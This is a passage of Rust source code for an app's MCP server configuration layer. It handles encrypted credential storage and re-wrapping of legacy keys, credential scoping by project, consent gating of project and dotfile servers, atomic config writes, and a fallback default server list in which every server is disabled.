use super::transport::TransportConfig;
use crate::core::mcp::manifest::AllowlistState;
use crate::core::mcp::McpResult;
use crate::sys::commands::mcp_oauth::refreshed_access_token;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fmt;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::io::AsyncWriteExt;

/// Error type for config decryption failures.
///
/// Provides detailed, actionable error messages so callers can distinguish
/// between corruption, key mismatch, encoding issues, and validation failures
/// instead of receiving garbage credentials.
#[derive(Debug)]
pub enum ConfigDecryptionError {
    /// The AES-256-GCM cipher could not be initialized from the derived key.
    CipherInit,
    /// The stored value is not valid base64.
    InvalidBase64(base64::DecodeError),
    /// The decoded ciphertext is too short to contain a 12-byte nonce.
    CiphertextTooShort { len: usize },
    /// AES-GCM decryption failed (wrong key, tampered ciphertext, or corrupt nonce).
    DecryptionFailed,
    /// The decrypted bytes are not valid UTF-8.
    InvalidUtf8(std::string::FromUtf8Error),
    /// The decrypted plaintext failed post-decryption validation.
    ValidationFailed(String),
    /// No encryption key could be derived, so the value was never opened.
    KeyUnavailable(String),
}

impl fmt::Display for ConfigDecryptionError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ConfigDecryptionError::CipherInit => {
                write!(f, "cipher initialization failed from derived key")
            }
            ConfigDecryptionError::InvalidBase64(e) => {
                write!(f, "stored value is not valid base64: {}", e)
            }
            ConfigDecryptionError::CiphertextTooShort { len } => {
                write!(
                    f,
                    "ciphertext too short ({} bytes, need at least 12 for nonce)",
                    len
                )
            }
            ConfigDecryptionError::DecryptionFailed => {
                write!(
                    f,
                    "AES-GCM decryption failed (wrong key or tampered ciphertext)"
                )
            }
            ConfigDecryptionError::InvalidUtf8(e) => {
                write!(f, "decrypted bytes are not valid UTF-8: {}", e)
            }
            ConfigDecryptionError::ValidationFailed(reason) => {
                write!(f, "decrypted credential validation failed: {}", reason)
            }
            ConfigDecryptionError::KeyUnavailable(reason) => {
                write!(f, "encryption key unavailable: {}", reason)
            }
        }
    }
}

impl std::error::Error for ConfigDecryptionError {}

/// Validate that a decrypted credential is well-formed.
///
/// Rejects empty strings and strings that contain non-printable control
/// characters (excluding common whitespace), which would indicate
/// partial decryption or data corruption.
fn validate_decrypted_credential(plaintext: &str) -> Result<(), ConfigDecryptionError> {
    if plaintext.is_empty() {
        return Err(ConfigDecryptionError::ValidationFailed(
            "decrypted value is empty".to_string(),
        ));
    }
    // Check for non-printable control characters (allow \t, \n, \r for
    // multiline tokens like PEM keys)
    if plaintext
        .chars()
        .any(|c| c.is_control() && c != '\t' && c != '\n' && c != '\r')
    {
        return Err(ConfigDecryptionError::ValidationFailed(
            "decrypted value contains non-printable control characters, \
             likely corrupted"
                .to_string(),
        ));
    }
    Ok(())
}

/// A credential recovered from an MCP config file or the settings database.
struct DecryptedCredential {
    value: String,
    /// The ciphertext opened only under a key older builds derived from machine
    /// identifiers alone. Any local process can recompute that key, so the
    /// value stays exposed until it is written back under the per-install key.
    from_legacy_key: bool,
}

/// Decrypt one MCP payload under the per-install key, falling back to the keys
/// a shipped build derived from machine identifiers alone.
///
/// `label` is how the payload appears in `machine_key::machine_only_payloads`;
/// the re-wrap entry points clear the same label once the value is rewritten.
fn decrypt_mcp_payload(
    encrypted: &str,
    label: &str,
) -> Result<DecryptedCredential, ConfigDecryptionError> {
    use crate::sys::security::machine_key::{self, KeyPurpose};
    use crate::sys::security::machine_key_rewrap;
    use base64::{engine::general_purpose, Engine as _};

    let combined = general_purpose::STANDARD
        .decode(encrypted)
        .map_err(ConfigDecryptionError::InvalidBase64)?;
    if combined.len() < 12 {
        return Err(ConfigDecryptionError::CiphertextTooShort {
            len: combined.len(),
        });
    }

    let opened = machine_key::open_with_key_rotation(KeyPurpose::McpCredentials, label, |key| {
        machine_key_rewrap::decrypt_combined(key, encrypted)
    })
    .map_err(|error| ConfigDecryptionError::KeyUnavailable(error.to_string()))?
    .ok_or(ConfigDecryptionError::DecryptionFailed)?;

    validate_decrypted_credential(&opened.value)?;

    Ok(DecryptedCredential {
        value: opened.value,
        from_legacy_key: opened.rewrap_required,
    })
}

const DEFAULT_CONFIG_JSON: &str = include_str!(concat!(
    env!("CARGO_MANIFEST_DIR"),
    "/mcp/default_servers.json"
));

/// Prefix for OAuth placeholder values (e.g., "<from_oauth:github>")
const OAUTH_PLACEHOLDER_PREFIX: &str = "<from_oauth:";
/// Prefix for API key placeholder values (e.g., "<from_api_key:vercel>")
const API_KEY_PLACEHOLDER_PREFIX: &str = "<from_api_key:";
/// Legacy credential manager placeholder
const CREDENTIAL_PLACEHOLDER: &str = "<from_credential_manager>";
const LEGACY_BEARER_CREDENTIAL_KEY: &str = "bearer_token";
const CREDENTIAL_ROW_PREFIX: &str = "mcp_secret/";
const USER_CREDENTIAL_SCOPE: &str = "user";
const MAX_CREDENTIAL_NAME_BYTES: usize = 256;

/// Whose credentials a server reads: the user's own, or those stored for the
/// project folder whose MCP config is active. A project config can never
/// reach a credential stored outside its own folder's scope.
pub fn active_credential_scope() -> String {
    credential_scope(McpServersConfig::active_project_folder_from_env().as_deref())
}

pub fn credential_scope(project_root: Option<&str>) -> String {
    match project_root {
        Some(project_root) => format!("project-{}", sha256_hex(&[project_root.as_bytes()])),
        None => USER_CREDENTIAL_SCOPE.to_string(),
    }
}

/// The scope and the hex-encoded server name hold no `/`, so no two
/// `(scope, server, key)` triples share a row.
pub fn mcp_credential_row(scope: &str, server_name: &str, key: &str) -> String {
    format!(
        "{CREDENTIAL_ROW_PREFIX}{scope}/{}/{key}",
        hex::encode(server_name)
    )
}

fn legacy_credential_row(server_name: &str, key: &str) -> String {
    format!("mcp_credential_{}_{}", server_name, key)
}

pub fn validate_credential_names(server_name: &str, key: &str) -> Result<(), String> {
    for (label, name) in [("server name", server_name), ("credential name", key)] {
        if name.trim().is_empty() {
            return Err(format!("The MCP {label} is empty"));
        }
        if name.len() > MAX_CREDENTIAL_NAME_BYTES {
            return Err(format!(
                "The MCP {label} is longer than {MAX_CREDENTIAL_NAME_BYTES} bytes"
            ));
        }
        if name.chars().any(char::is_control) {
            return Err(format!("The MCP {label} contains a control character"));
        }
    }
    Ok(())
}

fn credential_slot_keys(server: &McpServerConfig) -> Vec<&str> {
    server
        .env
        .keys()
        .map(String::as_str)
        .chain(std::iter::once(LEGACY_BEARER_CREDENTIAL_KEY))
        .collect()
}

pub(super) fn is_credential_reference(value: &str) -> bool {
    value.starts_with("<from_") && value.ends_with('>')
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum StoredSecretKind {
    ApiKey,
    SignIn,
}

/// One of the user's own stored secrets that a server names in its
/// configuration and is handed when it starts.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct StoredSecretReference {
    pub kind: StoredSecretKind,
    pub provider: String,
}

fn stored_secret_reference(value: &str) -> Option<StoredSecretReference> {
    if !value.ends_with('>') {
        return None;
    }
    let (kind, prefix) = if value.starts_with(OAUTH_PLACEHOLDER_PREFIX) {
        (StoredSecretKind::SignIn, OAUTH_PLACEHOLDER_PREFIX)
    } else if value.starts_with(API_KEY_PLACEHOLDER_PREFIX) {
        (StoredSecretKind::ApiKey, API_KEY_PLACEHOLDER_PREFIX)
    } else {
        return None;
    };
    let provider = &value[prefix.len()..value.len() - 1];
    (!provider.is_empty()).then(|| StoredSecretReference {
        kind,
        provider: provider.to_string(),
    })
}

/// The stored secrets a server is handed, read from the references in its
/// configuration and never from a value.
pub fn stored_secret_references(server: &McpServerConfig) -> Vec<StoredSecretReference> {
    let mut references: Vec<StoredSecretReference> = server
        .env
        .values()
        .filter_map(|value| stored_secret_reference(value))
        .collect();
    if let Some(TransportConfig::Http(http_config)) = &server.transport {
        references.extend(
            http_config
                .bearer_token
                .as_deref()
                .and_then(stored_secret_reference),
        );
    }
    references.sort();
    references.dedup();
    references
}
/// Marker prefix for an HTTP transport credential that is encrypted AT REST in the
/// config file (e.g. "<enc:BASE64_CIPHERTEXT>"). Distinguishes encrypted values from
/// plaintext and from the resolve-on-load placeholders above.
const ENCRYPTED_AT_REST_PREFIX: &str = "<enc:";
/// Environment variable used to resolve project-scoped MCP config.
pub const PROJECT_FOLDER_ENV_VAR: &str = "AGIWORKFORCE_PROJECT_FOLDER";

/// Returns the encrypted-at-rest form of a raw credential value, or `None` if the
/// value is empty, already encrypted, or a resolve-on-load placeholder (`<from_…>`).
fn maybe_encrypt_at_rest(value: &str) -> Option<String> {
    if value.is_empty()
        || value.starts_with(ENCRYPTED_AT_REST_PREFIX)
        || value.starts_with("<from_")
    {
        return None;
    }
    encrypt_mcp_credential(value).map(|ct| format!("{ENCRYPTED_AT_REST_PREFIX}{ct}>"))
}

/// Returns the decrypted credential for an `<enc:…>` value, or `None` if the value is
/// not encrypted-at-rest (plaintext or a `<from_…>` placeholder are left untouched).
fn maybe_decrypt_at_rest(value: &str, label: &str) -> Option<DecryptedCredential> {
    let inner = value
        .strip_prefix(ENCRYPTED_AT_REST_PREFIX)?
        .strip_suffix('>')?;
    decrypt_mcp_payload(inner, label).ok()
}

fn map_http_transport_credentials<F: Fn(&str) -> Option<String>>(
    config: &mut McpServersConfig,
    transform: F,
) {
    use crate::core::mcp::transport::TransportConfig;
    // Compute the replacement BEFORE assigning so the read-borrow is released first.
    let apply = |field: &mut Option<String>| {
        let next = field.as_deref().and_then(&transform);
        if let Some(next) = next {
            *field = Some(next);
        }
    };
    for server in config.mcp_servers.values_mut() {
        if let Some(TransportConfig::Http(http)) = server.transport.as_mut() {
            apply(&mut http.api_key);
            apply(&mut http.bearer_token);
            apply(&mut http.oauth_client_secret);
            for value in http.headers.values_mut() {
                let next = transform(value);
                if let Some(next) = next {
                    *value = next;
                }
            }
        }
    }
}

/// Encrypt raw HTTP transport credentials in place (for writing to disk).
fn encrypt_transport_credentials(config: &mut McpServersConfig) {
    map_http_transport_credentials(config, maybe_encrypt_at_rest);
}

/// Decrypt at-rest-encrypted HTTP transport credentials in place (after loading).
///
/// Reports whether any credential opened only under a legacy machine-only key,
/// so the caller can re-wrap the file those bytes came from.
fn decrypt_transport_credentials(config: &mut McpServersConfig, label: &str) -> bool {
    let from_legacy_key = std::cell::Cell::new(false);
    map_http_transport_credentials(config, |value| {
        let decrypted = maybe_decrypt_at_rest(value, label)?;
        if decrypted.from_legacy_key {
            from_legacy_key.set(true);
        }
        Some(decrypted.value)
    });
    from_legacy_key.get()
}

/// How a config file identifies itself while it still holds credentials wrapped
/// under a legacy machine-only key. Must match the label
/// `machine_key_rewrap::rewrap_encrypted_at_rest_file` clears.
fn machine_only_label(path: &std::path::Path) -> String {
    format!("file:{}", path.display())
}

/// Rewrite a config file whose credentials still open under a legacy
/// machine-only key.
///
/// The startup sweep reaches only the app-level config and the project already
/// open, so a config under any other project root is re-wrapped only here. It
/// re-reads and replaces the file, so it must not run on the loading task.
fn spawn_legacy_credential_rewrap(path: PathBuf) {
    tokio::task::spawn_blocking(move || {
        if let Err(error) =
            crate::sys::security::machine_key_rewrap::rewrap_encrypted_at_rest_file(&path)
        {
            tracing::warn!(
                "Could not re-wrap MCP credentials in {}: {error}",
                path.display()
            );
        }
    });
}
/// Project-level MCP config filename (compatible with Cursor/Claude workflows).
pub const PROJECT_MCP_CONFIG_FILENAME: &str = ".mcp.json";
/// Alternate project-level MCP config filename (used by Cursor/VS Code).
pub const PROJECT_MCP_ALT_CONFIG_FILENAME: &str = "mcp.json";
/// VS Code workspace MCP config path.
pub const PROJECT_VSCODE_MCP_RELATIVE_PATH: &str = ".vscode/mcp.json";
/// App-level fallback MCP config filename.
const GLOBAL_MCP_CONFIG_FILENAME: &str = "mcp-servers-config.json";

/// Configuration for an MCP server
///
/// Supports two transport modes:
/// - STDIO (default): Local process spawned with command/args
/// - HTTP/SSE: Remote server accessed via HTTP with Server-Sent Events
///
/// # Examples
///
/// ## STDIO transport (local process)
/// ```json
/// {
///   "command": "npx",
///   "args": ["-y", "@modelcontextprotocol/server-filesystem", "."],
///   "enabled": true
/// }
/// ```
///
/// ## HTTP/SSE transport (remote server)
/// ```json
/// {
///   "transport": {
///     "type": "http",
///     "url": "https://mcp.example.com",
///     "bearer_token": "your-api-token",
///     "timeout_secs": 30
///   },
///   "enabled": true
/// }
/// ```
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpServerConfig {
    /// Command to execute (required for STDIO transport)
    #[serde(default)]
    pub command: String,

    /// Arguments for the command (required for STDIO transport)
    #[serde(default)]
    pub args: Vec<String>,

    /// Environment variables for the process (STDIO transport only)
    #[serde(default)]
    pub env: HashMap<String, String>,

    /// Whether the server is enabled
    #[serde(default = "default_true")]
    pub enabled: bool,

    /// Transport configuration (defaults to STDIO if not specified)
    ///
    /// When set to HTTP, the command/args/env fields are ignored and
    /// the server is accessed via HTTP/SSE instead.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub transport: Option<TransportConfig>,

    /// The sandboxed server may reach services on this computer: loopback
    /// addresses and Unix-domain sockets, such as a local database, Ollama, a
    /// browser's debugging port or Docker. Off unless the user turns it on;
    /// it is part of the launch a project server's consent covers.
    #[serde(
        default,
        rename = "allowLocalNetwork",
        skip_serializing_if = "std::ops::Not::not"
    )]
    pub allow_local_network: bool,
}

fn default_true() -> bool {
    true
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpServersConfig {
    #[serde(rename = "mcpServers")]
    pub mcp_servers: HashMap<String, McpServerConfig>,
}

impl McpServersConfig {
    /// Every `(server, env key)` whose value is read from the credential
    /// store when the server starts.
    pub fn credential_store_keys(&self) -> Vec<(String, String)> {
        let mut keys: Vec<(String, String)> = self
            .mcp_servers
            .iter()
            .flat_map(|(server_name, server)| {
                server
                    .env
                    .iter()
                    .filter(|(_, value)| value.as_str() == CREDENTIAL_PLACEHOLDER)
                    .map(move |(key, _)| (server_name.clone(), key.clone()))
            })
            .collect();
        keys.sort();
        keys
    }

    fn legacy_row_claimants(&self, legacy_row: &str) -> usize {
        self.mcp_servers
            .iter()
            .map(|(name, server)| {
                credential_slot_keys(server)
                    .into_iter()
                    .filter(|key| legacy_credential_row(name, key) == legacy_row)
                    .count()
            })
            .sum()
    }

    /// The row this slot was stored under before rows carried a scope, when
    /// this server is configured, the slot is its own, and no other
    /// configured server and slot spell the same row. Project scopes never
    /// read one.
    fn sole_legacy_row(&self, scope: &str, server_name: &str, key: &str) -> Option<String> {
        if scope != USER_CREDENTIAL_SCOPE {
            return None;
        }
        let server = self.mcp_servers.get(server_name)?;
        if !credential_slot_keys(server).contains(&key) {
            return None;
        }
        let legacy_row = legacy_credential_row(server_name, key);
        (self.legacy_row_claimants(&legacy_row) == 1).then_some(legacy_row)
    }

    /// Moves a credential stored under its pre-scope row to its current row
    /// and deletes the old one. Returns whether a value was moved.
    pub fn adopt_legacy_credential(
        &self,
        conn: &rusqlite::Connection,
        scope: &str,
        server_name: &str,
        key: &str,
    ) -> Result<bool, String> {
        use rusqlite::OptionalExtension;

        let Some(legacy_row) = self.sole_legacy_row(scope, server_name, key) else {
            return Ok(false);
        };
        let stored: Option<String> = conn
            .query_row(
                "SELECT value FROM settings_v2 WHERE key = ?1",
                rusqlite::params![legacy_row],
                |row| row.get(0),
            )
            .optional()
            .map_err(|e| format!("Failed to read a stored credential: {e}"))?;
        let Some(stored) = stored else {
            return Ok(false);
        };

        let row = mcp_credential_row(scope, server_name, key);
        let already_current = conn
            .query_row(
                "SELECT 1 FROM settings_v2 WHERE key = ?1",
                rusqlite::params![row],
                |_| Ok(()),
            )
            .optional()
            .map_err(|e| format!("Failed to read a stored credential: {e}"))?
            .is_some();
        if !already_current {
            upsert_settings_v2_value(conn, &row, &stored, "security", true)?;
        }
        conn.execute(
            "DELETE FROM settings_v2 WHERE key = ?1",
            rusqlite::params![legacy_row],
        )
        .map_err(|e| format!("Failed to delete a stored credential: {e}"))?;
        Ok(!already_current)
    }

    pub fn adopt_legacy_credentials_of(
        &self,
        conn: &rusqlite::Connection,
        scope: &str,
        server_name: &str,
    ) {
        let Some(server) = self.mcp_servers.get(server_name) else {
            return;
        };
        for key in credential_slot_keys(server) {
            if let Err(error) = self.adopt_legacy_credential(conn, scope, server_name, key) {
                tracing::warn!(
                    "[MCP] The stored credential '{}' of '{}' was not moved to its current row: {}",
                    key,
                    server_name,
                    error
                );
            }
        }
    }

    /// The rows a delete of this slot removes: its current row, and its
    /// pre-scope row when this server alone spells it or no configured
    /// server does.
    pub fn deletable_credential_rows(
        &self,
        scope: &str,
        server_name: &str,
        key: &str,
    ) -> Vec<String> {
        let mut rows = vec![mcp_credential_row(scope, server_name, key)];
        if scope == USER_CREDENTIAL_SCOPE {
            let legacy_row = legacy_credential_row(server_name, key);
            if self.sole_legacy_row(scope, server_name, key).is_some()
                || self.legacy_row_claimants(&legacy_row) == 0
            {
                rows.push(legacy_row);
            }
        }
        rows
    }

    /// The credential rows that belonged to `removed`, called on the
    /// configuration it was removed from. A pre-scope row stays when a
    /// server still configured spells it.
    pub fn credential_rows_left_by(
        &self,
        scope: &str,
        server_name: &str,
        removed: &McpServerConfig,
    ) -> Vec<String> {
        let keys = credential_slot_keys(removed);
        let mut rows: Vec<String> = keys
            .iter()
            .map(|key| mcp_credential_row(scope, server_name, key))
            .collect();
        if scope == USER_CREDENTIAL_SCOPE {
            rows.extend(
                keys.iter()
                    .map(|key| legacy_credential_row(server_name, key))
                    .filter(|legacy_row| self.legacy_row_claimants(legacy_row) == 0),
            );
        }
        rows.sort();
        rows
    }

    pub fn project_config_candidates(project_root: &str) -> Vec<PathBuf> {
        let project_path = PathBuf::from(project_root);
        vec![
            project_path.join(PROJECT_MCP_CONFIG_FILENAME),
            project_path.join(PROJECT_MCP_ALT_CONFIG_FILENAME),
            project_path.join(PROJECT_VSCODE_MCP_RELATIVE_PATH),
        ]
    }

    /// True when `path` is a config file with content. An empty or
    /// whitespace-only file counts as absent.
    pub fn has_config_file(path: &std::path::Path) -> bool {
        path.exists() && !is_blank_config_file(path)
    }

    pub fn resolve_project_config_path(project_root: &str) -> PathBuf {
        let candidates = Self::project_config_candidates(project_root);
        for candidate in &candidates {
            if Self::has_config_file(candidate) {
                return candidate.clone();
            }
        }

        // Canonical write target when no project config file exists yet.
        candidates
            .first()
            .cloned()
            .unwrap_or_else(|| PathBuf::from(project_root).join(PROJECT_MCP_CONFIG_FILENAME))
    }

    /// Reads a config file. An empty or whitespace-only file reads as a
    /// config with no servers, the same as no file.
    pub async fn from_file(path: &PathBuf) -> crate::core::mcp::McpResult<Self> {
        let contents = tokio::fs::read_to_string(path).await?;
        if contents.trim().is_empty() {
            return Ok(Self {
                mcp_servers: HashMap::new(),
            });
        }
        let mut config: Self = serde_json::from_str(&contents)?;
        // Decrypt any at-rest-encrypted HTTP transport credentials (<enc:…>).
        if decrypt_transport_credentials(&mut config, &machine_only_label(path)) {
            spawn_legacy_credential_rewrap(path.clone());
        }
        Ok(config)
    }

    /// Servers read from a project's MCP file are discovery, not consent: a
    /// file in a repository can name any command. One stays enabled only when
    /// the user approved this exact launch, and the files it runs, for this
    /// project. Returns how many were turned off.
    pub fn disable_unconsented_project_servers(&mut self, project_root: &str) -> usize {
        let user_files_root = user_files_root();
        self.disable_unconsented_servers_with(|name, server| {
            launch_standing_with(
                Some(project_root),
                &user_files_root,
                name,
                server,
                &|scope, fingerprint| {
                    approval_on_record(scope, name).as_deref() == Some(fingerprint)
                },
            )
            .is_ok_and(|standing| standing.approval == LaunchApproval::Approved)
        })
    }

    fn disable_unconsented_servers_with(
        &mut self,
        consented: impl Fn(&str, &McpServerConfig) -> bool,
    ) -> usize {
        let mut disabled = 0;
        for (name, server) in self.mcp_servers.iter_mut() {
            if server.enabled && !consented(name, server) {
                server.enabled = false;
                disabled += 1;
            }
        }
        disabled
    }

    pub fn from_json(json: &str) -> crate::core::mcp::McpResult<Self> {
        let config: Self = serde_json::from_str(json)?;
        Ok(config)
    }

    pub async fn save_to_file(&self, path: &PathBuf) -> crate::core::mcp::McpResult<()> {
        // SECURITY: never write raw HTTP transport credentials (api_key / bearer_token
        // / header values) to disk in plaintext. Encrypt them at rest (<enc:…>) on a
        // clone before serializing; from_file decrypts them back on load. Placeholders
        // (<from_…>) are left untouched for the inject_credentials flow.
        let mut to_save = self.clone();
        encrypt_transport_credentials(&mut to_save);
        let json = serde_json::to_string_pretty(&to_save)?;
        let parent = path
            .parent()
            .ok_or_else(|| std::io::Error::other("Invalid config path"))?;
        tokio::fs::create_dir_all(parent).await?;

        // Write atomically via temp file + rename to avoid partial writes.
        let base_name = path
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("mcp-config");
        let temp_path = parent.join(format!(
            ".{}.{}.{}.tmp",
            base_name,
            std::process::id(),
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_nanos()
        ));

        let mut temp_file = tokio::fs::File::create(&temp_path).await?;
        temp_file.write_all(json.as_bytes()).await?;
        temp_file.sync_all().await?;
        drop(temp_file);

        if let Err(rename_err) = tokio::fs::rename(&temp_path, path).await {
            // Windows doesn't always replace existing destination on rename.
            if path.exists() {
                let _ = tokio::fs::remove_file(path).await;
                tokio::fs::rename(&temp_path, path).await?;
            } else {
                return Err(rename_err.into());
            }
        }
        Ok(())
    }

    pub fn project_config_path(project_root: &str) -> PathBuf {
        Self::resolve_project_config_path(project_root)
    }

    pub fn active_project_folder_from_env() -> Option<String> {
        let raw = std::env::var(PROJECT_FOLDER_ENV_VAR).ok()?;
        let normalized = raw.trim();
        if normalized.is_empty() {
            None
        } else {
            Some(normalized.to_string())
        }
    }

    pub fn default_config_path() -> crate::core::mcp::McpResult<PathBuf> {
        if let Some(project_root) = Self::active_project_folder_from_env() {
            return Ok(Self::project_config_path(&project_root));
        }

        let app_data =
            crate::sys::utils::app_data_dir().map_err(|e| std::io::Error::other(e.to_string()))?;
        Ok(app_data.join(GLOBAL_MCP_CONFIG_FILENAME))
    }

    /// Returns the path to the shared CLI dotfile MCP config,
    /// `~/.agiworkforce/mcp.json`, or `None` if the home directory can't be
    /// resolved.
    ///
    /// This is a genuinely separate, intentional cross-surface config file.
    /// not a duplicate of [`Self::default_config_path`]. `apps/cli` reads it
    /// directly as one of its default global MCP config locations
    /// (`apps/cli/src/mcp/mod.rs::load_default_mcp_configs`), `agi init`
    /// creates it by default (`apps/cli/src/init.rs`), and
    /// `apps/cli/src/sync.rs` treats it as one of the files synced across
    /// surfaces. See [`Self::merge_dotfile_servers`] for why the desktop MCP
    /// client also needs to honor it.
    pub fn dotfile_config_path() -> Option<PathBuf> {
        let home = dirs::home_dir()?;
        Some(home.join(".agiworkforce").join("mcp.json"))
    }

    /// Merge any servers declared in the shared CLI dotfile
    /// (`~/.agiworkforce/mcp.json`, see [`Self::dotfile_config_path`]) into
    /// `self`, without overwriting a server name already defined in the
    /// primary desktop config (primary config wins on name collisions).
    ///
    /// Fixes DESKTOP-MCP-DOTFILE-CONFIG-FAKE-SUCCESS-01: Settings → Developer
    /// (`DotfileSettings.tsx`) writes servers to this dotfile via the
    /// `dotfile_add_mcp_server` Tauri command, which used to show a success
    /// toast even though the live MCP client (this struct, loaded from
    /// [`Self::default_config_path`]) never read the file, the server was
    /// persisted but never actually connected or exposed tools. Call this on
    /// every config (re)load so dotfile-declared servers behave the same as
    /// servers added through the "Advanced MCP configuration" UI
    /// (`ConnectorGallery.tsx` → `mcp_update_config`).
    ///
    /// Best-effort: any I/O or parse failure is logged and treated as "no
    /// dotfile servers to merge" rather than propagated, since this file is
    /// optional and mainly written by other surfaces (CLI, this app's own
    /// Settings → Developer panel).
    pub fn merge_dotfile_servers(&mut self) {
        let Some(path) = Self::dotfile_config_path() else {
            return;
        };
        self.merge_dotfile_servers_at(&path);
    }

    fn merge_dotfile_servers_at(&mut self, path: &std::path::Path) {
        if !path.exists() {
            return;
        }

        let content = match std::fs::read_to_string(path) {
            Ok(content) => content,
            Err(error) => {
                tracing::warn!(
                    "[MCP] Failed to read dotfile MCP config '{}': {}",
                    path.display(),
                    error
                );
                return;
            }
        };

        let parsed: serde_json::Value = match serde_json::from_str(&content) {
            Ok(value) => value,
            Err(error) => {
                tracing::warn!(
                    "[MCP] Failed to parse dotfile MCP config '{}': {}",
                    path.display(),
                    error
                );
                return;
            }
        };

        let Some(servers) = parsed.get("mcpServers").and_then(|v| v.as_object()) else {
            return;
        };

        let mut merged_count = 0usize;
        for (name, value) in servers {
            if self.mcp_servers.contains_key(name) {
                // Primary config wins on name collisions.
                continue;
            }

            match serde_json::from_value::<McpServerConfig>(value.clone()) {
                Ok(mut server_config) => {
                    if server_config.command.is_empty() && server_config.transport.is_none() {
                        tracing::warn!(
                            "[MCP] Skipping dotfile MCP server '{}': no command or transport configured",
                            name
                        );
                        continue;
                    }
                    // A shared config entry is discovery, not Desktop consent.
                    // Starting it could open a remote connection or execute an
                    // imported package-manager command during a Local launch.
                    server_config.enabled = false;
                    self.mcp_servers.insert(name.clone(), server_config);
                    merged_count += 1;
                }
                Err(error) => {
                    tracing::warn!(
                        "[MCP] Skipping invalid dotfile MCP server '{}': {}",
                        name,
                        error
                    );
                }
            }
        }

        if merged_count > 0 {
            tracing::info!(
                "[MCP] Merged {} server(s) from ~/.agiworkforce/mcp.json",
                merged_count
            );
        }
    }

    /// Write additional server entries into the shared CLI dotfile
    /// (`~/.agiworkforce/mcp.json`), creating the file (and its parent
    /// directory) if necessary and preserving any existing content.
    /// Entries whose name collides with an existing dotfile entry are
    /// overwritten (last write wins).
    ///
    /// This is the persistence half of the fix for the
    /// `import_ecosystem_mcp_servers` sibling of
    /// DESKTOP-MCP-DOTFILE-CONFIG-FAKE-SUCCESS-01: that command used to scan
    /// other AI tools' MCP configs and return the results with a success
    /// toast, but never wrote anything anywhere, so "Imported N MCP
    /// server(s)" was true only of the in-memory scan result, never of any
    /// durable state. Callers should follow this with
    /// `McpState::reload_active_config` so the live client picks up the
    /// newly-written entries immediately (mirrors `dotfile_add_mcp_server`).
    pub fn write_dotfile_servers(entries: &[(String, McpServerConfig)]) -> Result<usize, String> {
        if entries.is_empty() {
            return Ok(0);
        }

        let path = Self::dotfile_config_path().ok_or_else(|| {
            "Could not resolve home directory for ~/.agiworkforce/mcp.json".to_string()
        })?;
        Self::write_dotfile_servers_at(&path, entries)
    }

    fn write_dotfile_servers_at(
        path: &std::path::Path,
        entries: &[(String, McpServerConfig)],
    ) -> Result<usize, String> {
        if entries.is_empty() {
            return Ok(0);
        }
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)
                .map_err(|e| format!("Failed to create dotfile directory: {}", e))?;
        }

        let mut root: serde_json::Value = if path.exists() {
            let content = std::fs::read_to_string(path)
                .map_err(|e| format!("Failed to read mcp.json: {}", e))?;
            serde_json::from_str(&content)
                .map_err(|e| format!("Failed to parse mcp.json: {}", e))?
        } else {
            serde_json::json!({ "mcpServers": {} })
        };

        let servers = root
            .as_object_mut()
            .ok_or_else(|| "mcp.json root is not an object".to_string())?
            .entry("mcpServers")
            .or_insert_with(|| serde_json::json!({}));

        let servers_map = servers
            .as_object_mut()
            .ok_or_else(|| "mcpServers is not an object".to_string())?;

        let mut written = 0usize;
        for (name, config) in entries {
            let value = serde_json::to_value(config)
                .map_err(|e| format!("Failed to serialize server '{}': {}", name, e))?;
            servers_map.insert(name.clone(), value);
            written += 1;
        }

        let output = serde_json::to_string_pretty(&root)
            .map_err(|e| format!("Failed to serialize mcp.json: {}", e))?;
        std::fs::write(path, output).map_err(|e| format!("Failed to write mcp.json: {}", e))?;

        Ok(written)
    }

    pub fn default() -> Self {
        serde_json::from_str(DEFAULT_CONFIG_JSON).unwrap_or_else(|error| {
            tracing::error!(
                "Failed to parse packaged MCP defaults ({}). Falling back to legacy config.",
                error
            );
            Self::fallback_config()
        })
    }

    fn fallback_config() -> Self {
        let mut mcp_servers = HashMap::new();

        mcp_servers.insert(
            "filesystem".to_string(),
            McpServerConfig {
                command: "npx".to_string(),
                args: vec![
                    "-y".to_string(),
                    "@modelcontextprotocol/server-filesystem".to_string(),
                    ".".to_string(),
                ],
                env: HashMap::new(),
                enabled: false,
                transport: None,
                allow_local_network: false,
            },
        );

        mcp_servers.insert(
            "github".to_string(),
            McpServerConfig {
                command: "npx".to_string(),
                args: vec![
                    "-y".to_string(),
                    "@modelcontextprotocol/server-github".to_string(),
                ],
                env: {
                    let mut env = HashMap::new();
                    // Use OAuth token first, fall back to legacy credential manager
                    env.insert(
                        "GITHUB_PERSONAL_ACCESS_TOKEN".to_string(),
                        "<from_oauth:github>".to_string(),
                    );
                    env
                },
                enabled: false,
                transport: None,
                allow_local_network: false,
            },
        );

        mcp_servers.insert(
            "google-drive".to_string(),
            McpServerConfig {
                command: "npx".to_string(),
                args: vec![
                    "-y".to_string(),
                    "@modelcontextprotocol/server-gdrive".to_string(),
                ],
                env: {
                    let mut env = HashMap::new();
                    // Google Drive uses OAuth for authentication
                    env.insert(
                        "GOOGLE_ACCESS_TOKEN".to_string(),
                        "<from_oauth:google>".to_string(),
                    );
                    env
                },
                enabled: false,
                transport: None,
                allow_local_network: false,
            },
        );

        mcp_servers.insert(
            "stripe".to_string(),
            McpServerConfig {
                command: "npx".to_string(),
                args: vec![
                    "-y".to_string(),
                    "@modelcontextprotocol/server-stripe".to_string(),
                ],
                env: {
                    let mut env = HashMap::new();
                    env.insert(
                        "STRIPE_SECRET_KEY".to_string(),
                        "<from_credential_manager>".to_string(),
                    );
                    env
                },
                enabled: false,
                transport: None,
                allow_local_network: false,
            },
        );

